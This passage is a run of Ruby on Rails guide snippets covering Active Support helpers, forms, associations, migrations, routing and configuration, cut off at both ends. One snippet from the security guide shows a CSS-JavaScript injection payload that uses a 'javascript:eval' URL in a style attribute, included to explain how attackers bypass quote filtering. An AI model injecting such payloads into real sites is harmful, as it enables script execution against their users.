zeroing hour will zero minutes and seconds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_164\n\nLANGUAGE: ruby\nCODE:\n```\nnow = DateTime.current\n# => Tue, 08 Jun 2010 01:56:22 +0000\nnow.change(year: 2011, offset: Rational(-6, 24))\n# => Wed, 08 Jun 2011 01:56:22 -0600\n```\n\nLANGUAGE: ruby\nCODE:\n```\nnow.change(hour: 0)\n# => Tue, 08 Jun 2010 00:00:00 +0000\n```\n\nLANGUAGE: ruby\nCODE:\n```\nnow.change(min: 0)\n# => Tue, 08 Jun 2010 01:00:00 +0000\n```\n\n----------------------------------------\n\nTITLE: HTML output of PATCH form\nDESCRIPTION: This HTML code demonstrates how Rails emulates the PATCH method using a hidden input field named `_method` within a standard POST form. The `_method` field is set to `patch` to instruct Rails to process the form submission as a PATCH request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_28\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/search\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"patch\" autocomplete=\"off\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"R4quRuXQAq75TyWpSf8AwRyLt-R1uMtPP1dHTTWJE5zbukiaY8poSTXxq3Z7uAjXfPHiKQDsWE1i2_-h0HSktQ\" autocomplete=\"off\">\n<!-- ... -->\n</form>\n```\n\n----------------------------------------\n\nTITLE: Humanize String with acronym\nDESCRIPTION: Shows how to humanize a string containing acronyms, taking into account configured acronyms. This ensure proper formatting of acronyms in human readable strings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Inflector.inflections do |inflect|\n  inflect.acronym \"SSL\"\nend\n\n\"ssl_error\".humanize # => \"SSL error\"\n```\n\n----------------------------------------\n\nTITLE: Enabling Eager Loading in Test Environment\nDESCRIPTION: This code shows how to enable eager loading in the test environment, typically done in CI, by checking for an environment variable.  Newly generated Rails applications are configured this way by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_117\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/test.rb\nconfig.eager_load = ENV[\"CI\"].present?\n```\n\n----------------------------------------\n\nTITLE: Removing Middleware from API-Only Rails App - Ruby\nDESCRIPTION: Shows how to remove a middleware (here, Rack::Sendfile) from the Rails API middleware stack via config.middleware.delete. Useful for customizing the stack and optimizing performance; should be used with caution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.delete ::Rack::Sendfile\n```\n\n----------------------------------------\n\nTITLE: Setting queue name prefix for a specific job\nDESCRIPTION: This snippet demonstrates overriding the global queue name prefix for a specific job by setting `self.queue_name_prefix = nil` within the job class. This ensures that the job's queue name will not be prefixed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_as :low_priority\n  self.queue_name_prefix = nil\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Adding uuid type to action_text_rich_texts migration\nDESCRIPTION: This migration change adds `type: :uuid` for the record references, ensuring that all models using Action Text attributes use UUID values for unique identifiers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nt.references :record, null: false, polymorphic: true, index: false, type: :uuid\n```\n\n----------------------------------------\n\nTITLE: Enabling Mailer View Fragment Caching (Ruby)\nDESCRIPTION: This configuration snippet enables fragment caching in Action Mailer by setting perform_caching to true in the environment config file. Needed to utilize fragment caching in mailer views as shown in the previous snippet.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.perform_caching = true\n```\n\n----------------------------------------\n\nTITLE: Route Definition for Composite Key Parameter\nDESCRIPTION: This snippet shows the route definition that corresponds to the controller action extracting the composite key parameter. The route defines a parameter `:id` which will contain the composite key values delimited by an underscore.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/books/:id\", to: \"books#show\"\n```\n\n----------------------------------------\n\nTITLE: Conditional before_save Callback with Symbol in Rails\nDESCRIPTION: Demonstrates how to conditionally execute a `before_save` callback using the `:if` option with a symbol. The `normalize_card_number` method is only called if the `paid_with_card?` method returns true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  before_save :normalize_card_number, if: :paid_with_card?\nend\n```\n\n----------------------------------------\n\nTITLE: Route Matching with HTTP Method Specification in Rails 4.0\nDESCRIPTION: Rails 4.0 requires that routes using match must specify the HTTP request method with via parameter, or use method-specific helpers like get.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\n# Rails 3.x\nmatch \"/\" => \"root#index\"\n\n# becomes\nmatch \"/\" => \"root#index\", via: :get\n\n# or\nget \"/\" => \"root#index\"\n```\n\n----------------------------------------\n\nTITLE: Redirecting Back in Rails\nDESCRIPTION: This snippet shows how to use `redirect_back` to redirect the user to the page they came from. It demonstrates the use of `fallback_location` to handle cases where the `HTTP_REFERER` header is not set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_back(fallback_location: root_path)\n```\n\n----------------------------------------\n\nTITLE: Rails POST Request with JSON Ruby\nDESCRIPTION: Illustrates how to make a POST request to create a new resource, including passing parameters and specifying the content type as JSON. The example creates a new article with a 'title' attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\npost articles_url, params: { article: { title: \"Ahoy!\" } }, as: :json\n```\n\n----------------------------------------\n\nTITLE: Incorrect Import From @rails/ujs in Rails 7.1\nDESCRIPTION: Example showing the incorrect way to import modules from @rails/ujs in Rails 7.1. Direct importing of specific modules is no longer supported and will result in errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nimport { fileInputSelector } from \"@rails/ujs\"\n// ERROR: export 'fileInputSelector' (imported as 'fileInputSelector') was not found in '@rails/ujs' (possible exports: default)\n```\n\n----------------------------------------\n\nTITLE: Making AJAX Requests with Rails Request.JS\nDESCRIPTION: This JavaScript snippet demonstrates how to use the FetchRequest class from Rails Request.JS to make AJAX requests with proper CSRF token handling.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nimport { FetchRequest } from '@rails/request.js'\n\n....\n\nasync myMethod () {\n  const request = new FetchRequest('post', 'localhost:3000/posts', {\n    body: JSON.stringify({ name: 'Request.JS' })\n  })\n  const response = await request.perform()\n  if (response.ok) {\n    const body = await response.text\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Action Cable Debugging in Rails 6\nDESCRIPTION: This snippet shows how to enable and disable Action Cable debugging in Rails 6. The startDebugging and stopDebugging methods have been replaced with a logger.enabled property.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_32\n\nLANGUAGE: javascript\nCODE:\n```\n-    ActionCable.startDebugging()\n+    ActionCable.logger.enabled = true\n\n-    ActionCable.stopDebugging()\n+    ActionCable.logger.enabled = false\n```\n\n----------------------------------------\n\nTITLE: Using the Touch Option in ActiveRecord Associations\nDESCRIPTION: Demonstrates how to use the :touch option to update timestamps on associated records. When true, the updated_at/updated_on of the associated record will be updated when the parent record is saved or destroyed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_111\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, touch: true\nend\n\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Custom Configuration Options in Rails\nDESCRIPTION: This snippet shows how to access custom configuration options that were set in the Rails configuration. It retrieves the values of `config.x.payment_processing.schedule`, `config.x.payment_processing.retries`, and `config.super_debugger`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_113\n\nLANGUAGE: ruby\nCODE:\n```\nRails.configuration.x.payment_processing.schedule # => :daily\nRails.configuration.x.payment_processing.retries  # => 3\nRails.configuration.x.payment_processing.not_set  # => nil\nRails.configuration.super_debugger                # => true\n```\n\n----------------------------------------\n\nTITLE: Explicit Bi-directional Association with inverse_of Option\nDESCRIPTION: Example showing how to explicitly declare bi-directional associations using the inverse_of option when using custom association names or options that prevent automatic identification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, inverse_of: \"writer\"\nend\n\nclass Book < ApplicationRecord\n  belongs_to :writer, class_name: \"Author\", foreign_key: \"author_id\"\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Nested Custom Configuration in Rails\nDESCRIPTION: This code illustrates how to add nested custom configuration options to the Rails application config object using `config.x`.  This allows for namespaced configuration settings that can be accessed through `Rails.configuration.x`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.x.payment_processing.schedule = :daily\nRails.configuration.x.payment_processing.schedule # => :daily\n```\n\n----------------------------------------\n\nTITLE: Basic Home View Template\nDESCRIPTION: A simple HTML template for the home index page that displays a heading and the flash notice, both with hardcoded English text.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_15\n\nLANGUAGE: html+erb\nCODE:\n```\n<!-- app/views/home/index.html.erb -->\n<h1>Hello World</h1>\n<p><%= flash[:notice] %></p>\n```\n\n----------------------------------------\n\nTITLE: Setting Cookie Expiration in Rails\nDESCRIPTION: This code shows how to set a cookie to expire after a specific duration (1 hour in this example) using the `:expires` option. This ensures the cookie persists for a limited time.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\ncookies[:login] = { value: \"XJ-122\", expires: 1.hour }\n```\n\n----------------------------------------\n\nTITLE: Using Rails 3.0 Command Line Interface\nDESCRIPTION: Examples of using the new rails command line interface that replaces the previous script/* commands for common tasks like launching console and generating scaffolds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ rails console                      # instead of script/console\n$ rails g scaffold post title:string # instead of script/generate scaffold post title:string\n```\n\n----------------------------------------\n\nTITLE: Calculating Time Ago and Since in Ruby\nDESCRIPTION: The `ago` method calculates a timestamp in the past by a specified number of seconds from midnight. The `since` method moves forward a specified number of seconds from midnight.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_158\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.current # => Fri, 11 Jun 2010\ndate.ago(1)         # => Thu, 10 Jun 2010 23:59:59 EDT -04:00\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.current # => Fri, 11 Jun 2010\ndate.since(1)       # => Fri, 11 Jun 2010 00:00:01 EDT -04:00\n```\n\n----------------------------------------\n\nTITLE: Using `presence` for Conditional Assignment\nDESCRIPTION: This example demonstrates the use of the `presence` method to conditionally assign a value. If `config[:host]` is present, it assigns that value; otherwise, it defaults to 'localhost'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nhost = config[:host].presence || \"localhost\"\n```\n\n----------------------------------------\n\nTITLE: Preparing the database\nDESCRIPTION: This command prepares the database, ensuring that all necessary tables, including those required by Solid Queue, are created. This includes running migrations for the `queue` database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:prepare\n```\n\n----------------------------------------\n\nTITLE: Implementing Memoization in Ruby on Rails\nDESCRIPTION: Shows how to use the memoization feature in Active Support to cache method results. This optimizes performance by storing and reusing the result of expensive computations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: Ruby\nCODE:\n```\nextend ActiveSupport::Memoizable\n\ndef full_name\n  \"#{first_name} #{last_name}\"\nend\nmemoize :full_name\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial Without Required Local Raises Error\nDESCRIPTION: Illustrates the error raised when rendering a partial without a required local variable defined by the `locals:` signature.  It emphasizes the importance of supplying all required locals when strict locals are enforced.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nrender \"messages/message\"\n# => ActionView::Template::Error: missing local: :message for app/views/messages/_message.html.erb\n```\n\n----------------------------------------\n\nTITLE: Simulate Unknown Migration Version - Bash\nDESCRIPTION: This command demonstrates how Rails handles an attempt to migrate to a non-existent migration version. It shows the error message that is raised when the specified version number is not found.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_68\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate VERSION=00000000000000\n```\n\n----------------------------------------\n\nTITLE: Asserting Route Recognition in Rails (Ruby)\nDESCRIPTION: Asserts that a given path is recognized and routes to a specified controller and action. The first argument is a hash representing the expected routing options, and the second argument is the path to be tested.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_88\n\nLANGUAGE: ruby\nCODE:\n```\nassert_recognizes({ controller: \"photos\", action: \"show\", id: \"1\" }, \"/photos/1\")\n```\n\n----------------------------------------\n\nTITLE: Manual Requiring of Dependencies in Ruby (Not Recommended for Rails)\nDESCRIPTION: This snippet demonstrates the manual way of requiring dependencies in a Ruby file, which is not necessary or recommended in Rails applications due to autoloading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n# DO NOT DO THIS.\nrequire \"application_controller\"\nrequire \"post\"\n# DO NOT DO THIS.\n\nclass PostsController < ApplicationController\n  def index\n    @posts = Post.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Running Application Migrations (Bash)\nDESCRIPTION: Executes all pending database migrations within the host application's context using `bin/rails db:migrate`. This includes both the application's own migrations and any migrations copied from engines.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_34\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Implementing Association Callbacks in Rails ActiveRecord\nDESCRIPTION: Example of using association callbacks to execute custom logic when objects are added to an association. This demonstrates how to validate or restrict additions to a collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_140\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, before_add: :check_credit_limit\n\n  def check_credit_limit(book)\n    throw(:abort) if limit_reached?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Database Configuration Without Schema Management in YAML\nDESCRIPTION: Configuration example for connecting to external databases without schema management tasks using database_tasks: false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  primary:\n    database: my_database\n    adapter: mysql2\n  animals:\n    database: my_animals_database\n    adapter: mysql2\n    database_tasks: false\n```\n\n----------------------------------------\n\nTITLE: Secondary Rails Route File Example (Ruby)\nDESCRIPTION: Example of a secondary route file (e.g., `admin.rb`) used with the `draw` macro. It contains standard routing DSL calls within a namespace.  Do not include `Rails.application.routes.draw` in these secondary files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_92\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes/admin.rb\n\nnamespace :admin do\n  resources :comments\nend\n```\n\n----------------------------------------\n\nTITLE: Advanced CSS-JavaScript injection with eval\nDESCRIPTION: A more complex CSS injection technique using JavaScript's eval function to execute code. This demonstrates how attackers can bypass quote filtering restrictions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_49\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"mycode\" expr=\"alert('hah!')\" style=\"background:url('javascript:eval(document.all.mycode.expr)')\">\n```\n\n----------------------------------------\n\nTITLE: Validating Presence of an Associated Object in Rails (Ruby)\nDESCRIPTION: Demonstrates how to validate the presence of an associated object using the `presence` validator in a `Supplier` model. It checks if the associated `account` object exists, not just the foreign key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account\n  validates :account, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Assigning Attributes Using the attributes= Alias\nDESCRIPTION: This snippet demonstrates using the `attributes=` method, which is an alias for `assign_attributes`, to set multiple attributes at once using a hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\n\nirb> person.attributes = { name: \"John\", date_of_birth: \"1998-01-01\", active: false }\n\nirb> person.name\n=> \"John\"\nirb> person.date_of_birth\n=> \"1998-01-01\"\n```\n\n----------------------------------------\n\nTITLE: Permitting the Description Parameter - Ruby\nDESCRIPTION: This code updates the `product_params` method in the `ProductsController` to permit the 'description' parameter.  This allows the 'description' field to be submitted and saved from the form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\n    # Only allow a list of trusted parameters through.\n    def product_params\n      params.expect(product: [ :name, :description ])\n    end\n```\n\n----------------------------------------\n\nTITLE: Equality Condition with Composite Primary Key in Rails\nDESCRIPTION: Illustrates querying a model with a composite primary key using the `Book.primary_key` to specify the condition. This allows targeting specific combinations of the composite key values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  self.primary_key = [:author_id, :id]\nend\n\nBook.where(Book.primary_key => [[2, 1], [3, 1]])\n```\n\n----------------------------------------\n\nTITLE: Cherry-picking a Merged Pull Request for Rails Backporting\nDESCRIPTION: Command to cherry-pick a merged pull request commit to the backport branch. The -m1 flag is used to specify the first parent in the merge commit, which is essential when cherry-picking merge commits.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_49\n\nLANGUAGE: bash\nCODE:\n```\n$ git cherry-pick -m1 MERGE_SHA\n```\n\n----------------------------------------\n\nTITLE: Defining YAML Translations for Action Mailer Subjects in Rails\nDESCRIPTION: This YAML snippet demonstrates how to define translations for email subjects in Rails, including an example with interpolation for personalized subjects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_42\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  user_mailer:\n    welcome:\n      subject: \"Welcome to Rails Guides!\"\n\nen:\n  user_mailer:\n    welcome:\n      subject: \"%{user}, welcome to Rails Guides!\"\n```\n\n----------------------------------------\n\nTITLE: Initialize and Find Callbacks in Rails ActiveRecord\nDESCRIPTION: Demonstrates the use of after_initialize and after_find callbacks in a Rails ActiveRecord model. The after_initialize callback is triggered when an object is instantiated, and the after_find callback is triggered when a record is loaded from the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_initialize do |user|\n    Rails.logger.info(\"You have initialized an object!\")\n  end\n\n  after_find do |user|\n    Rails.logger.info(\"You have found an object!\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Running Generator Tests with Debugging\nDESCRIPTION: Command to run tests against generators with debugging output enabled. The RAILS_LOG_TO_STDOUT environment variable ensures that debugging tools will work properly during testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_29\n\nLANGUAGE: bash\nCODE:\n```\nRAILS_LOG_TO_STDOUT=true ./bin/test test/generators/actions_test.rb\n```\n\n----------------------------------------\n\nTITLE: Including Acts as Yaffle in Application Record for Ruby on Rails\nDESCRIPTION: This code snippet demonstrates how to include the Acts as Yaffle module in the ApplicationRecord class, making it available to all models in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationRecord < ActiveRecord::Base\n  include Yaffle::ActsAsYaffle\n\n  self.abstract_class = true\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a Reference\nDESCRIPTION: This snippet demonstrates adding a reference column using the `add_reference` method.  It creates a `role_id` column in the `users` table, which references the `id` column in the `roles` table and creates an index on `role_id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nadd_reference :users, :role\n```\n\n----------------------------------------\n\nTITLE: Example of Race Condition When Checking for Uniqueness\nDESCRIPTION: Shows an example of code that incorrectly attempts to check for uniqueness using include?, which is subject to race conditions and should be avoided in favor of database-level constraints.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_134\n\nLANGUAGE: ruby\nCODE:\n```\nperson.articles << article unless person.articles.include?(article)\n```\n\n----------------------------------------\n\nTITLE: Creating and Saving Associated Objects in a Has and Belongs to Many Relationship in Rails\nDESCRIPTION: Example of using the create method to instantiate and save a new assembly associated with a part, creating the link through the join table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\n@assembly = @part.assemblies.create({ assembly_name: \"Transmission housing\" })\n```\n\n----------------------------------------\n\nTITLE: Example Cache Existence Check Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_exist?.active_support event when checking if a key exists in the cache, showing the key and store class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"name-of-complicated-computation\",\n  store: \"ActiveSupport::Cache::MemCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SHA256 for Signed Cookies in Rails\nDESCRIPTION: This code changes the digest algorithm used for signed cookies from the default to SHA256, improving security. It sets the new configuration value for all future signed cookies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.action_dispatch.signed_cookie_digest = \"SHA256\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Polymorphic Associations in Ruby on Rails\nDESCRIPTION: Demonstrates how to set up a polymorphic association where a Picture model can belong to either an Employee or a Product model through a single association called 'imageable'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nclass Picture < ApplicationRecord\n  belongs_to :imageable, polymorphic: true\nend\n\nclass Employee < ApplicationRecord\n  has_many :pictures, as: :imageable\nend\n\nclass Product < ApplicationRecord\n  has_many :pictures, as: :imageable\nend\n```\n\n----------------------------------------\n\nTITLE: Listing Middleware - Rails Command - Bash\nDESCRIPTION: Displays all middleware currently used by the Rails application. This is useful for troubleshooting or customizing the middleware stack in API-only or full Rails apps. Must be run from the Rails project directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails middleware\n```\n\n----------------------------------------\n\nTITLE: Adding Foreign Key to Existing Table in Rails Migration\nDESCRIPTION: Demonstrates how to add a foreign key reference to an existing table using a migration. This example adds an author reference to the books table to support the belongs_to association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_95\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddAuthorToBooks < ActiveRecord::Migration[8.1]\n  def change\n    add_reference :books, :author\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a Unique Index to Enforce Association Uniqueness in Rails Migration\nDESCRIPTION: Shows how to add a unique index in a migration to enforce uniqueness at the database level for a join table (readings), preventing duplicate associations between a person and an article.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_132\n\nLANGUAGE: ruby\nCODE:\n```\nadd_index :readings, [:person_id, :article_id], unique: true\n```\n\n----------------------------------------\n\nTITLE: Using Where with String Conditions in Association Scopes\nDESCRIPTION: Demonstrates using the where method with a string condition in an association scope. This example filters assemblies to only include those from the 'Seattle' factory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_117\n\nLANGUAGE: ruby\nCODE:\n```\nclass Parts < ApplicationRecord\n  has_and_belongs_to_many :assemblies,\n    -> { where \"factory = 'Seattle'\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Table Without Primary Key (Ruby)\nDESCRIPTION: This migration demonstrates how to create a `users` table without a primary key by setting the `id` option to `false` during table creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_33\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateUsers < ActiveRecord::Migration[8.1]\n  def change\n    create_table :users, id: false do |t|\n      t.string :username\n      t.string :email\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Rescue Responses for Action Dispatch\nDESCRIPTION: This snippet shows how to configure custom rescue responses for Action Dispatch, mapping specific exceptions to HTTP status codes. This example maps `MyAuthenticationError` to the `:unauthorized` status.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.rescue_responses[\"MyAuthenticationError\"] = :unauthorized\n```\n\n----------------------------------------\n\nTITLE: Custom routing with HTTP PATCH in Ruby on Rails\nDESCRIPTION: Shows how to configure routes for RESTful resources using HTTP PATCH method, which became the primary verb for updates in Rails 4. Includes both standard and custom route examples.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\nresources :users\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass UsersController < ApplicationController\n  def update\n    # No change needed; PATCH will be preferred, and PUT will still work.\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nresources :users do\n  put :update_name, on: :member\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass UsersController < ApplicationController\n  def update_name\n    # Change needed; form_for will try to use a non-existent PATCH route.\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nresources :users do\n  patch :update_name, on: :member\nend\n```\n\n----------------------------------------\n\nTITLE: Bi-directional Association with Custom Foreign Key\nDESCRIPTION: Example of a bi-directional association that Rails cannot automatically identify due to custom options. This leads to N+1 queries and data inconsistency issues.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_105\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books\nend\n\nclass Book < ApplicationRecord\n  belongs_to :writer, class_name: \"Author\", foreign_key: \"author_id\"\nend\n```\n\n----------------------------------------\n\nTITLE: Specifying Join Table for HABTM Relationship in Ruby on Rails\nDESCRIPTION: Shows how to explicitly specify the join table name for a has_and_belongs_to_many relationship between models with a common prefix in Rails 4.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\nclass CatalogCategory < ActiveRecord::Base\n  has_and_belongs_to_many :catalog_products, join_table: \"catalog_categories_catalog_products\"\nend\n\nclass CatalogProduct < ActiveRecord::Base\n  has_and_belongs_to_many :catalog_categories, join_table: \"catalog_categories_catalog_products\"\nend\n```\n\n----------------------------------------\n\nTITLE: HTML for _destroy Checkbox in Rails\nDESCRIPTION: This HTML snippet shows the generated HTML for the `_destroy` checkbox. When this checkbox is checked and the form is submitted, the corresponding address record will be marked for deletion.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_84\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"checkbox\" value=\"1\" name=\"person[addresses_attributes][0][_destroy]\" id=\"person_addresses_attributes_0__destroy\">\n```\n\n----------------------------------------\n\nTITLE: Creating a BirthdayCake object to trigger callback in Rails\nDESCRIPTION: This IRB snippet demonstrates how to create a `BirthdayCake` object, which triggers the `after_create` callback defined in the model. The output shows the message logged by the callback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_1\n\nLANGUAGE: irb\nCODE:\n```\nirb> 